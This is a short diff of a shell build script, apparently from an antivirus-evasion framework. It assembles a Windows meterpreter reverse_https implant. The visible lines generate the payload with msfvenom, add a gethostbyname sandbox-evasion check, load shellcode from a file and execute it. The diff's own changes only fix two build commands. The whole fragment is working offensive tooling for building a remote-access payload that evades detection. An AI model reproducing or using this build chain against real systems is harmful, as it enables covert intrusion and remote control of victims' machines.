@@ -22,14 +22,14 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/s
 # add gethostbyname sandbox evasion
 add_evasion gethostbyname_sandbox_evasion
 # set define to specify which hostname is attempted to be resolved
-append_value HOSTVALUE "this.that" source/evasion/evasion.include
+printf "\n#define HOSTVALUE \"this.that\"\n" >> source/evasion/evasion.include
 
 # set shellcode source
 set_shellcode_source static_from_file input/sc.txt
 
 # set decoder and key source
 set_decoder none
-set_keys_source none
+set_key_source none
 
 # set shellcode binding technique
 set_shellcode_binding exec_shellcode
